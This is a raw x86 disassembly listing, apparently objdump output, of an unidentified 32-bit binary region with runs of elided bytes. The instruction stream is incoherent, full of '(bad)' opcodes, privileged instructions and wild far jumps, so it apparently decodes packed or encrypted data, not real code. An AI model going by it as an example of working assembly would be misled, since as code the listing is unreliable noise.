  42b347:	dec    esp
  42b348:	test   DWORD PTR [edx+ecx*4],ecx
  42b34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b34c:	pop    ecx
  42b34d:	inc    ebp
  42b34e:	mov    BYTE PTR [edi-0x25],dl
  42b351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b352:	adc    al,0xbf
  42b354:	xchg   esp,eax
  42b355:	das    
  42b356:	mov    ebx,0x2c2f09f0
  42b35b:	add    DWORD PTR [esi-0x6f],0x23
  42b35f:	push   0x1a
  42b361:	mov    edx,0xcb38b0ba
  42b366:	ret    
  42b367:	xchg   edi,eax
  42b368:	jne    0x42b302
  42b36a:	mov    bl,0x7f
  42b36c:	sub    cl,0x18
  42b36f:	stos   BYTE PTR es:[edi],al
  42b370:	sar    DWORD PTR [eax],1
  42b372:	hlt    
  42b373:	xchg   ecx,eax
  42b374:	pop    esi
  42b375:	shl    eax,1
  42b377:	xlat   BYTE PTR ds:[ebx]
  42b378:	lods   eax,DWORD PTR ds:[esi]
  42b379:	mov    cl,0xb1
  42b37b:	or     DWORD PTR [ebp-0x6d],eax
  42b37e:	xchg   edi,eax
  42b37f:	in     eax,0x81
  42b381:	mov    ch,BYTE PTR [ecx+esi*4]
  42b384:	and    ecx,ebx
  42b386:	iret   
  42b387:	dec    esi
  42b388:	adc    al,0xfc
  42b38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b38b:	ret    0x2055
  42b38e:	stos   DWORD PTR es:[edi],eax
  42b38f:	repnz hlt 
  42b391:	inc    edx
  42b392:	popf   
  42b393:	and    eax,0x78f5edd
  42b398:	test   BYTE PTR [edi],bh
  42b39a:	dec    BYTE PTR [edi]
  42b39c:	or     BYTE PTR [ebp+0x7067d9ec],bh
  42b3a2:	lods   eax,DWORD PTR ds:[esi]
  42b3a3:	(bad)  
  42b3a4:	mov    eax,ds:0x6efacb3c
  42b3a9:	mov    ecx,0x4770475d
  42b3ae:	test   BYTE PTR [ecx+0x51099179],al
  42b3b4:	js     0x42b42b
  42b3b6:	mov    eax,0xafc56cc3
  42b3bb:	aam    0x59
  42b3bd:	push   esp
  42b3be:	lock adc BYTE PTR ds:0x6e6cb9b,bh
  42b3c5:	mov    esp,0x490803c5
  42b3ca:	xor    BYTE PTR [eax+esi*8+0x1ea32f85],0xfe
  42b3d2:	dec    esi
  42b3d3:	aam    0x9f
  42b3d5:	data16 clc 
  42b3d7:	add    ecx,DWORD PTR [ebx+0x15b598f8]
  42b3dd:	jne    0x42b372
  42b3df:	pushf  
  42b3e0:	(bad)
  42b3e4:	pop    ss
  42b3e5:	inc    ecx
  42b3e6:	jb     0x42b435
  42b3e8:	and    al,0xf9
  42b3ea:	cmp    ch,bh
  42b3ec:	inc    eax
  42b3ed:	out    dx,al
  42b3ee:	clc    
  42b3ef:	dec    edx
  42b3f0:	adc    bl,cl
  42b3f2:	sbb    eax,0xc7123b29
  42b3f7:	or     ebp,DWORD PTR [esi-0x2a]
  42b3fa:	test   DWORD PTR [esi-0x39],0x5f989525
  42b401:	sub    eax,0xd1483f39
  42b406:	dec    esi
  42b407:	(bad)  
  42b408:	scas   al,BYTE PTR es:[edi]
  42b409:	push   ecx
  42b40a:	fdiv   QWORD PTR [eax+0x3]
  42b40d:	mov    eax,ds:0x46dcda
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   eax,esp
  42b481:	mov    dl,0x8c
  42b483:	sar    BYTE PTR [ecx+0x50001cf],cl
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    bh,ch
  42b48d:	call   0xdc9b7a7
  42b492:	sbb    BYTE PTR [edi],0x2e
  42b495:	fidiv  WORD PTR [ecx-0x6a]
  42b498:	xchg   esi,eax
  42b499:	xchg   ebp,eax
  42b49a:	retf   
  42b49b:	push   ebx
  42b49c:	in     eax,0x5f
  42b49e:	icebp  
  42b49f:	add    al,0xf8
  42b4a1:	xor    ecx,DWORD PTR [ebx+0x35cc409a]
  42b4a7:	jmp    0x42b4e2
  42b4a9:	popa   
  42b4aa:	lea    edi,[ebx-0x4e10fe74]
  42b4b0:	out    dx,eax
  42b4b1:	jge    0x42b4b3
  42b4b3:	test   eax,0xefb0c0bf
  42b4b8:	mov    esi,0xd50f2a61
  42b4bd:	push   ss
  42b4be:	add    BYTE PTR [eax+0x18241c06],bl
  42b4c4:	mov    WORD PTR [edx-0x67],ds
  42b4c7:	mov    edx,0x825d48d9
  42b4cc:	cmp    ebp,DWORD PTR [ebx+ebx*8-0xb0e63d5]
  42b4d3:	mov    cl,0x75
  42b4d5:	pop    edx
  42b4d6:	shl    DWORD PTR [ebx],cl
  42b4d8:	inc    esi
  42b4d9:	hlt    
  42b4da:	stc    
  42b4db:	rcr    ch,cl
  42b4dd:	jnp    0x42b4cb
  42b4df:	js     0x42b47b
  42b4e1:	(bad)  
  42b4e2:	jnp    0x42b48d
  42b4e4:	jg     0x42b48b
  42b4e6:	in     al,0x19
  42b4e8:	push   edx
  42b4e9:	ret    
  42b4ea:	ins    DWORD PTR es:[edi],dx
  42b4eb:	jle    0x42b524
  42b4ed:	(bad)  
  42b4ef:	xor    BYTE PTR [esp+esi*1],ah
  42b4f2:	out    dx,al
  42b4f3:	xlat   BYTE PTR ds:[ebx]
  42b4f4:	push   0x7a
  42b4f6:	push   ds
  42b4f7:	cld    
  42b4f8:	repz fmul DWORD PTR [ebp+ebx*2+0x18421e71]
  42b500:	mov    ah,0x62
  42b502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b503:	ins    BYTE PTR es:[edi],dx
  42b504:	fsubr  QWORD PTR [edi-0x16]
  42b507:	xchg   edx,eax
  42b508:	push   ebx
  42b509:	mov    ebp,0x8db16d9c
  42b50e:	add    eax,0xeb767d9b
  42b513:	jmp    0x22144338
  42b518:	es xchg edi,eax
  42b51a:	pop    esi
  42b51b:	iret   
  42b51c:	pop    esp
  42b51d:	imul   edi,DWORD PTR [edx+0x26a6a705],0xffffff8c
  42b524:	push   esi
  42b525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b526:	pop    edi
  42b527:	aad    0x73
  42b529:	jne    0x42b4b6
  42b52b:	add    eax,0x84c8a98c
  42b530:	or     ebp,0xffffffec
  42b533:	mov    ecx,0xdaaf2230
  42b538:	cs jo  0x42b58b
  42b53b:	xchg   DWORD PTR [ebx+0x73],esi
  42b53e:	sbb    edx,DWORD PTR [edi-0x52]
  42b541:	popf   
  42b542:	inc    esi
  42b543:	stos   BYTE PTR es:[edi],al
  42b544:	dec    edx
  42b545:	shl    BYTE PTR [edi+edi*4+0xc],0xdf
  42b54a:	sar    BYTE PTR [esi+ebx*1],cl
  42b54d:	ret    
  42b54e:	imul   esp,ebx,0x48
  42b551:	lea    eax,[esi]
  42b553:	mov    ch,0xe
  42b555:	adc    esp,DWORD PTR [ecx]
  42b557:	call   FWORD PTR [esi]
  42b559:	add    ah,BYTE PTR [edx]
  42b55b:	add    edx,DWORD PTR [edx+0x4f68a2c5]
  42b561:	call   FWORD PTR [edx]
  42b563:	sub    al,0x1e
  42b565:	(bad)  
  42b566:	push   0x7f
  42b568:	pop    es
  42b569:	inc    ebp
  42b56a:	pop    ecx
  42b56b:	std    
  42b56c:	mov    bl,0xa5
  42b56e:	cmp    DWORD PTR [ebx+eiz*8-0x56],esp
  42b572:	dec    esi
  42b573:	in     al,0xb0
  42b575:	imul   edx,DWORD PTR [edx-0x69],0xffffffa4
  42b579:	in     eax,0x1f
  42b57b:	shl    DWORD PTR [ebp-0x40],1
  42b57e:	xchg   esp,eax
  42b57f:	mov    DWORD PTR [ebp-0x25],ebp
  42b582:	or     edi,eax
  42b584:	scas   eax,DWORD PTR es:[edi]
  42b585:	imul   ebx,DWORD PTR [ebx+0x707f4336],0x7071a47e
  42b58f:	or     al,0xcb
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	imul   edx,eax,0xd0be5dc0
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    eax,0xfa000001
  42b60d:	int3   
  42b60e:	and    BYTE PTR [ebx+0x53],dh
  42b611:	mov    esp,0x8dc4851b
  42b616:	ret    0xc491
  42b619:	jge    0x42b666
  42b61b:	push   esi
  42b61c:	lods   eax,DWORD PTR ds:[esi]
  42b61d:	ret    
  42b61e:	pop    edi
  42b61f:	or     BYTE PTR [esi+0x29642c4a],0x95
  42b626:	int    0x31
  42b628:	mov    ch,0x47
  42b62a:	fsubr  st,st(0)
  42b62c:	mov    cl,ch
  42b62e:	or     ebx,0xab2f0cfd
  42b634:	sar    DWORD PTR [ecx],0x13
  42b637:	sub    eax,0xb8c050f2
  42b63c:	mov    bl,BYTE PTR [ebx+ebp*2-0x1a]
  42b640:	or     al,BYTE PTR [ebp+0x25]
  42b643:	fs xchg edi,eax
  42b645:	ins    DWORD PTR es:[edi],dx
  42b646:	push   edx
  42b647:	pop    eax
  42b648:	test   DWORD PTR [edi-0x45c87f9],esi
  42b64e:	pop    ebx
  42b64f:	dec    ebp
  42b650:	fucomp st(7)
  42b652:	cs retf 
  42b654:	jbe    0x42b608
  42b656:	cmp    BYTE PTR [edi+0x3f4ce73],cl
  42b65c:	pop    edi
  42b65d:	push   edx
  42b65e:	xor    ebx,DWORD PTR ds:0x417033c9
  42b664:	jb     0x42b691
  42b666:	loop   0x42b6a0
  42b668:	jns    0x42b670
  42b66a:	cmp    al,0x81
  42b66c:	ins    DWORD PTR es:[edi],dx
  42b66d:	pop    eax
  42b66e:	push   ss
  42b66f:	mov    ecx,0xbb72c33
  42b674:	aad    0x78
  42b676:	dec    eax
  42b677:	shr    edx,0xb5
  42b67a:	xchg   esi,eax
  42b67b:	out    0xcd,eax
  42b67d:	lea    edx,[edi+0x78]
  42b680:	ins    BYTE PTR es:[edi],dx
  42b681:	adc    edi,DWORD PTR [eax+0x33]
  42b684:	pop    ds
  42b685:	or     ecx,DWORD PTR [ebx-0x21bb917b]
  42b68b:	call   0xa919:0xa1f3f362
  42b692:	jns    0x42b621
  42b694:	iret   
  42b695:	or     DWORD PTR [ebx+0x1c],0x761d45b7
  42b69c:	fisttp QWORD PTR [edx]
  42b69e:	jecxz  0x42b707
  42b6a0:	and    al,0x6e
  42b6a2:	inc    ebp
  42b6a3:	test   al,0x10
  42b6a5:	(bad)  
  42b6a7:	mov    eax,0x3f9eceb1
  42b6ac:	dec    edx
  42b6ad:	dec    ebx
  42b6ae:	sub    al,0x77
  42b6b0:	mov    bl,BYTE PTR [ecx+0x47145739]
  42b6b6:	stc    
  42b6b7:	xchg   edi,eax
  42b6b8:	push   0xffffffcc
  42b6ba:	mov    al,ds:0x72f203e9
  42b6bf:	sbb    DWORD PTR [ebx-0x37a417c6],0xec71c7fa
  42b6c9:	gs addr16 and ch,bl
  42b6cd:	cmp    eax,0x97090ede
  42b6d2:	cs mov cl,0xd4
  42b6d5:	pop    es
  42b6d6:	pop    ss
  42b6d7:	rcr    DWORD PTR [ecx],0xcb
  42b6da:	add    DWORD PTR [esi],eax
  42b6dc:	scas   al,BYTE PTR es:[edi]
  42b6dd:	aad    0x79
  42b6df:	push   ecx
  42b6e0:	mov    dh,0xce
  42b6e2:	out    0xdd,eax
  42b6e4:	inc    ecx
  42b6e5:	aad    0xba
  42b6e7:	xor    eax,0x97083325
  42b6ec:	arpl   WORD PTR [esp+ecx*8+0x39a9394d],di
  42b6f3:	mov    edx,es
  42b6f5:	sahf   
  42b6f6:	xchg   esp,eax
  42b6f7:	mov    ebp,0x76fe1293
  42b6fc:	dec    eax
  42b6fd:	je     0x42b6ad
  42b6ff:	and    DWORD PTR [edi],eax
  42b701:	jno    0x42b752
  42b703:	test   bh,ch
  42b705:	icebp  
  42b706:	cwde   
  42b707:	lahf   
  42b708:	jae    0x42b71e
  42b70a:	pop    ss
  42b70b:	out    dx,eax
  42b70c:	and    DWORD PTR [esi+0x247e95],ebx
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	std    
  42b781:	jb     0x42b72f
  42b783:	loope  0x42b748
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0xcb000001,al
  42b78d:	xor    bh,BYTE PTR [esi+0x8]
  42b790:	dec    esp
  42b791:	add    esi,DWORD PTR [ebx+0x4]
  42b794:	test   eax,0x63d95bac
  42b799:	pop    es
  42b79a:	(bad)  
  42b79b:	push   eax
  42b79c:	mov    dl,0x65
  42b79e:	outs   dx,DWORD PTR ds:[esi]
  42b79f:	dec    ebp
  42b7a0:	mov    ebx,0xbe8f744c
  42b7a5:	mov    esp,0x4bb1702
  42b7aa:	and    cl,BYTE PTR [ebx]
  42b7ac:	push   ebp
  42b7ad:	push   0x3f
  42b7af:	daa    
  42b7b0:	mov    bh,0x0
  42b7b2:	adc    DWORD PTR [edi-0x8],ebx
  42b7b5:	test   DWORD PTR [ecx+0x4d42a193],eax
  42b7bb:	mov    edi,0x638b8fdf
  42b7c0:	inc    edx
  42b7c1:	xchg   bl,bh
  42b7c3:	xor    esi,DWORD PTR [ebx+0x1eac154d]
  42b7c9:	pop    ecx
  42b7ca:	mov    cl,0x69
  42b7cc:	mov    eax,0x284ab31a
  42b7d1:	inc    esi
  42b7d2:	(bad)  
  42b7d4:	mov    al,0xe8
  42b7d6:	mov    dl,0x57
  42b7d8:	pop    eax
  42b7d9:	ret    
  42b7da:	in     al,0x2d
  42b7dc:	sub    cl,cl
  42b7de:	push   cs
  42b7df:	aad    0x56
  42b7e1:	retf   0xcfa5
  42b7e4:	inc    edi
  42b7e5:	xor    al,BYTE PTR [ebp+0x8]
  42b7e8:	sub    eax,DWORD PTR [ecx+0x3f]
  42b7eb:	loop   0x42b770
  42b7ed:	repnz mov dh,0x8a
  42b7f0:	sub    eax,0x553d6c03
  42b7f5:	lods   eax,DWORD PTR ds:[esi]
  42b7f6:	mov    edi,ecx
  42b7f8:	cmp    ah,BYTE PTR [ecx+0x255b6950]
  42b7fe:	repnz test DWORD PTR gs:[edx+0x59f7e40],0x1b7c4007
  42b80a:	test   esi,edi
  42b80c:	out    0x4f,al
  42b80e:	jecxz  0x42b820
  42b810:	pop    ecx
  42b811:	out    0xc7,al
  42b813:	rcl    BYTE PTR [ebp+esi*4-0x2d],1
  42b817:	clc    
  42b818:	pop    edx
  42b819:	or     eax,esi
  42b81b:	loopne 0x42b843
  42b81d:	jmp    0x42b809
  42b81f:	call   0xfd73662f
  42b824:	ss aaa 
  42b826:	inc    esp
  42b827:	sub    dh,BYTE PTR [edx+0x1de2939]
  42b82d:	or     al,0x9d
  42b82f:	sub    al,0xa
  42b831:	dec    ebp
  42b832:	inc    esp
  42b833:	lds    esi,FWORD PTR [ebx]
  42b835:	xchg   esp,eax
  42b836:	push   ebx
  42b837:	add    edi,DWORD PTR [ecx-0x21]
  42b83a:	out    0x7d,al
  42b83c:	daa    
  42b83d:	retf   
  42b83e:	nop
  42b83f:	jge    0x42b886
  42b841:	mov    bl,0x33
  42b843:	adc    edx,eax
  42b845:	ficom  DWORD PTR [eax+0x6a722aaf]
  42b84b:	es jb  0x42b883
  42b84e:	mov    ah,0xb4
  42b850:	js     0x42b83e
  42b852:	mov    ebp,ecx
  42b854:	dec    esp
  42b855:	xchg   ebx,eax
  42b856:	mov    DWORD PTR [ecx+0x2b],ebp
  42b859:	mov    ebx,0x94cf5183
  42b85e:	xchg   esi,eax
  42b85f:	popa   
  42b860:	js     0x42b82a
  42b862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b863:	in     al,0x77
  42b865:	jnp    0x42b8d7
  42b867:	mov    esi,0xb4984951
  42b86c:	gs dec cx
  42b86f:	cdq    
  42b870:	das    
  42b871:	xchg   ebp,eax
  42b872:	call   0x9a0a378f
  42b877:	loope  0x42b84b
  42b879:	xor    bl,BYTE PTR [eax+edi*1+0x4d]
  42b87d:	push   0xffffffdc
  42b87f:	add    al,0xca
  42b881:	pop    es
  42b882:	ins    DWORD PTR es:[edi],dx
  42b883:	add    DWORD PTR [eax],0x3d330a6a
  42b889:	ret    
  42b88a:	xchg   esi,eax
  42b88b:	sbb    eax,0xfe4dec5c
  42b890:	adc    al,BYTE PTR [eax]
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     edx,esi
  42b901:	jnp    0x42b8d6
  42b903:	cwde   
  42b904:	enter  0x1d2,0x0
  42b908:	add    eax,0xdd000001
  42b90d:	cld    
  42b90e:	(bad)  
  42b910:	or     ecx,DWORD PTR [ecx+eax*1+0x4e]
  42b914:	shl    DWORD PTR [edx-0x10190a0e],0x31
  42b91b:	xor    eax,0xf2ba3b7e
  42b920:	mov    edi,0x5f62e6fa
  42b925:	mov    al,0x72
  42b928:	cmp    eax,0x2e20c212
  42b92d:	test   BYTE PTR ds:0x625be506,dh
  42b933:	int3   
  42b934:	les    edx,FWORD PTR [ecx+0x38]
  42b937:	jbe    0x42b96a
  42b939:	repz ja 0x42b980
  42b93c:	xlat   BYTE PTR ds:[ebx]
  42b93d:	mov    ds:0x737bb52d,al
  42b942:	jo     0x42b8ed
  42b944:	mov    al,0x67
  42b946:	xchg   edi,eax
  42b947:	push   0xffffffb9
  42b949:	mov    ecx,0x24f7550d
  42b94e:	jo     0x42b8e6
  42b950:	push   ss
  42b951:	loope  0x42b98d
  42b953:	enter  0xb8a8,0xed
  42b957:	aaa    
  42b958:	(bad)  
  42b959:	pop    ebp
  42b95a:	(bad)  
  42b95b:	mov    ds:0x2a3a4829,al
  42b960:	push   ebx
  42b961:	xchg   ecx,eax
  42b962:	fstp   DWORD PTR [esi-0x48befd2b]
  42b968:	scas   al,BYTE PTR es:[edi]
  42b969:	xor    ch,BYTE PTR [ebp+esi*1+0x23165707]
  42b970:	jmp    0xc588e1da
  42b975:	outs   dx,BYTE PTR ds:[esi]
  42b976:	scas   eax,DWORD PTR es:[edi]
  42b977:	std    
  42b978:	ret    0xd3a6
  42b97b:	retf   
  42b97c:	ss mov al,0xb2
  42b97f:	leave  
  42b980:	cld    
  42b981:	push   edi
  42b982:	inc    BYTE PTR [ecx+edx*4+0x67]
  42b986:	dec    ecx
  42b987:	iret   
  42b988:	xor    DWORD PTR [ebp+ebx*1-0x6c],ebp
  42b98c:	and    BYTE PTR ds:0xf1297d8,al
  42b992:	jmp    0x42b961
  42b994:	rsm    
  42b996:	jmp    0x2040:0x796ca54c
  42b99d:	jl     0x42b99a
  42b99f:	cmp    dl,dh
  42b9a1:	push   esi
  42b9a2:	aad    0x3d
  42b9a4:	pop    esi
  42b9a5:	fistp  QWORD PTR [edx]
  42b9a7:	mov    eax,0x7d79e648
  42b9ac:	lods   al,BYTE PTR ds:[esi]
  42b9ad:	sub    BYTE PTR [ebx+ecx*8],bl
  42b9b0:	call   0x10e13385
  42b9b5:	cmp    ecx,edx
  42b9b7:	mov    ebp,0xd129b49e
  42b9bc:	fs and eax,0xc29322b6
  42b9c2:	xchg   BYTE PTR [ecx+0x2a],bh
  42b9c5:	mov    ah,0x2c
  42b9c7:	pop    eax
  42b9c8:	or     bh,BYTE PTR [ebp-0x7d]
  42b9cb:	sub    eax,0xf821fa66
  42b9d0:	jo     0x42b9e5
  42b9d2:	ud0    eax,DWORD PTR [ebx+0x763d7e31]
  42b9d9:	and    eax,0x1056b64d
  42b9de:	adc    eax,0xb492b3f4
  42b9e3:	mov    cs,WORD PTR [esi-0x5e2f64e8]
  42b9e9:	xchg   DWORD PTR [ebx+0x6518ad58],eax
  42b9ef:	rcl    ecx,1
  42b9f1:	das    
  42b9f2:	into   
  42b9f3:	xor    DWORD PTR [ecx+ecx*4+0x373acad],ebp
  42b9fa:	loope  0x42b9cf
  42b9fc:	cmc    
  42b9fd:	pop    edx
  42b9fe:	adc    BYTE PTR [esi-0x80],ah
  42ba01:	adc    BYTE PTR [eax-0x6c5e6c42],dh
  42ba07:	add    BYTE PTR [esi+0x40304f43],0x2
  42ba0e:	or     eax,DWORD PTR [edi+0x6b]
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [esi+edx*1-0x2c32c59c],esp
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0x56000001
  42ba8d:	in     al,0xa8
  42ba8f:	or     al,0x29
  42ba91:	(bad)  
  42ba92:	nop
  42ba93:	jge    0x42ba78
  42ba95:	retf   
  42ba96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba97:	ret    
  42ba98:	push   edi
  42ba99:	ds jnp 0x42bb18
  42ba9c:	jmp    0xc6a41323
  42baa1:	mov    bl,0x1b
  42baa3:	xor    BYTE PTR [ebx-0x72],bh
  42baa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42baa7:	add    al,0x59
  42baa9:	add    al,BYTE PTR [ebx-0x103ec63b]
  42baaf:	aad    0x6
  42bab1:	sbb    bl,dh
  42bab3:	add    al,0x45
  42bab5:	adc    al,0xe4
  42bab7:	jo     0x42ba46
  42bab9:	mov    dl,0x50
  42babb:	dec    ebp
  42babc:	stos   DWORD PTR es:[edi],eax
  42babd:	loop   0x42baac
  42babf:	out    dx,al
  42bac0:	leave  
  42bac1:	das    
  42bac2:	cmp    esp,DWORD PTR [ebx-0x4d1064f3]
  42bac8:	fnstenv [edx-0x19]
  42bacb:	jo     0x42ba6a
  42bacd:	xchg   ebp,eax
  42bace:	dec    edi
  42bacf:	inc    edx
  42bad0:	test   DWORD PTR [esi],ebx
  42bad2:	xchg   ebp,eax
  42bad3:	pop    eax
  42bad4:	popa   
  42bad5:	pop    edi
  42bad6:	adc    edx,DWORD PTR [eax]
  42bad8:	xor    BYTE PTR [edi+0x38],0x93
  42badc:	xor    BYTE PTR [ebp+0x1a],ch
  42badf:	cli    
  42bae0:	out    dx,al
  42bae1:	dec    esp
  42bae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bae3:	fst    DWORD PTR [ecx+ebp*1]
  42bae6:	or     ch,cl
  42bae8:	(bad)  
  42bae9:	(bad)  
  42baea:	add    esp,DWORD PTR [esi+eiz*2+0x41dd0025]
  42baf1:	xor    eax,0x5dd3e408
  42baf6:	jno    0x42baf3
  42baf8:	nop
  42baf9:	lahf   
  42bafa:	in     eax,dx
  42bafb:	mov    bh,0x28
  42bafd:	push   es
  42bafe:	mov    dh,0x7
  42bb00:	stos   DWORD PTR es:[edi],eax
  42bb01:	xor    DWORD PTR [ebp-0x7047539c],edx
  42bb07:	adc    al,ch
  42bb09:	(bad)  
  42bb0a:	mov    edi,0x184503f2
  42bb0f:	into   
  42bb10:	xor    dh,BYTE PTR [ebp+0x43]
  42bb13:	call   0xea50c6d3
  42bb18:	xchg   DWORD PTR [eax],edi
  42bb1a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb1c:	aam    0x1
  42bb1e:	push   ecx
  42bb1f:	ror    BYTE PTR [eax+ebp*4-0xc],1
  42bb23:	aad    0xcd
  42bb25:	into   
  42bb26:	cdq    
  42bb27:	adc    ch,bl
  42bb29:	sbb    edx,DWORD PTR [ebx-0x34]
  42bb2c:	je     0x42baf7
  42bb2e:	in     al,0xe5
  42bb30:	push   ds
  42bb31:	nop
  42bb32:	inc    esi
  42bb33:	pop    esi
  42bb34:	dec    ebp
  42bb35:	fisttp WORD PTR [edx+eiz*8+0x5a]
  42bb39:	and    BYTE PTR [ecx-0x77],dh
  42bb3c:	mov    dl,0x54
  42bb3e:	dec    eax
  42bb3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb40:	(bad)  
  42bb41:	out    0x31,eax
  42bb43:	mov    eax,ds:0x2bd7c207
  42bb48:	(bad)  
  42bb49:	clc    
  42bb4a:	aad    0x82
  42bb4c:	(bad)  
  42bb4d:	cld    
  42bb4e:	ror    DWORD PTR [eax],0xf8
  42bb51:	sbb    DWORD PTR [esi],edi
  42bb53:	lods   eax,DWORD PTR ds:[si]
  42bb55:	pop    edi
  42bb56:	(bad)  
  42bb57:	sub    edi,DWORD PTR [edx+edi*4+0x64ad223a]
  42bb5e:	hlt    
  42bb5f:	mov    ch,0x6b
  42bb61:	jl     0x42bbe0
  42bb63:	js     0x42baf0
  42bb65:	mov    edi,0x5f91e0a4
  42bb6a:	in     eax,dx
  42bb6b:	and    BYTE PTR [edi+0x3275fa09],ah
  42bb71:	lea    edx,[ebx-0x8f674e8]
  42bb77:	add    eax,0x226f537b
  42bb7c:	sbb    DWORD PTR [edx+0x41],edx
  42bb7f:	gs adc dl,ch
  42bb82:	add    esi,DWORD PTR [ebx]
  42bb84:	imul   bh
  42bb86:	cdq    
  42bb87:	add    ecx,DWORD PTR [ebx-0x434a5967]
  42bb8d:	iret   
  42bb8e:	call   0x0:0x4e80
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	ficomp DWORD PTR [ecx-0x2b2d1326]
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0x7c000001
  42bc0d:	sbb    ah,BYTE PTR [edi+ecx*4+0x1341fada]
  42bc14:	pop    ss
  42bc15:	mov    eax,0x4382da45
  42bc1a:	shl    DWORD PTR [ebp+0xc],0x65
  42bc1e:	sub    dh,dl
  42bc20:	in     al,dx
  42bc21:	dec    eax
  42bc22:	cmp    bh,ah
  42bc24:	ffreep st(6)
  42bc26:	and    eax,0xd3d14511
  42bc2b:	or     ecx,ecx
  42bc2d:	xor    DWORD PTR [esi+0x1236efc9],esp
  42bc33:	mov    ds,WORD PTR [eax-0x6a]
  42bc36:	hlt    
  42bc37:	imul   ecx,DWORD PTR [si-0x78],0xa
  42bc3c:	in     eax,dx
  42bc3d:	(bad)  
  42bc3e:	mov    dl,0xaf
  42bc40:	mov    ecx,DWORD PTR [edx-0x70c7842d]
  42bc46:	ret    
  42bc47:	mov    al,0x3a
  42bc49:	les    edx,FWORD PTR [esi]
  42bc4b:	sbb    al,0x45
  42bc4d:	jnp    0x42bbd0
  42bc4f:	dec    eax
  42bc50:	bound  edi,QWORD PTR [ebp+0x129086a5]
  42bc56:	data16 adc BYTE PTR ds:0x561c1ffe,dl
  42bc5d:	inc    edx
  42bc5e:	lods   eax,DWORD PTR ds:[esi]
  42bc5f:	test   DWORD PTR [edx+0x6c],edx
  42bc62:	or     al,0xed
  42bc64:	add    ah,dh
  42bc66:	out    0x23,eax
  42bc68:	cs addr16 push ds
  42bc6b:	jg     0x42bc91
  42bc6d:	lods   eax,DWORD PTR ds:[esi]
  42bc6e:	sub    ebx,esp
  42bc70:	pop    es
  42bc71:	inc    esi
  42bc72:	int3   
  42bc73:	cmp    DWORD PTR [ecx*4-0x3ab0c95],esp
  42bc7a:	imul   dl
  42bc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc7d:	fnop   
  42bc7f:	rcl    al,1
  42bc81:	gs pop esi
  42bc83:	inc    edx
  42bc84:	xchg   DWORD PTR [ebx*4-0x5564a8],ebx
  42bc8b:	mov    esp,edx
  42bc8d:	dec    esi
  42bc8e:	pop    es
  42bc8f:	jge    0x42bc37
  42bc91:	test   al,0x8c
  42bc93:	jo     0x42bc1f
  42bc95:	jmp    0x3bb5:0x78cb6f4
  42bc9c:	inc    ebx
  42bc9d:	xor    al,0x26
  42bc9f:	pop    ss
  42bca0:	and    eax,0x73661329
  42bca5:	popf   
  42bca6:	inc    ebx
  42bca7:	fwait
  42bca8:	and    al,0x8f
  42bcaa:	or     eax,0xde027cdd
  42bcaf:	adc    DWORD PTR [eax-0x2d],0xffffff95
  42bcb3:	outs   dx,BYTE PTR ds:[esi]
  42bcb4:	push   edi
  42bcb5:	sar    DWORD PTR [eax+0x1f],1
  42bcb8:	pop    ebp
  42bcb9:	das    
  42bcba:	fwait
  42bcbb:	inc    eax
  42bcbc:	mov    ch,0x85
  42bcbe:	imul   dl
  42bcc0:	out    0xc4,al
  42bcc2:	fiadd  DWORD PTR [edx]
  42bcc4:	retf   
  42bcc5:	pop    ds
  42bcc6:	push   eax
  42bcc7:	add    al,0x62
  42bcc9:	mov    eax,ds:0xc5de97aa
  42bcce:	inc    esi
  42bccf:	(bad)  
  42bcd0:	mov    al,ds:0x31d8be1f
  42bcd5:	scas   eax,DWORD PTR es:[edi]
  42bcd6:	xchg   ebx,eax
  42bcd7:	pushf  
  42bcd8:	pop    edx
  42bcd9:	cdq    
  42bcda:	clc    
  42bcdb:	mov    ebp,0xfde648a4
  42bce0:	mov    ecx,DWORD PTR [ebp-0x5c]
  42bce3:	sub    DWORD PTR [ecx-0x1755c696],edi
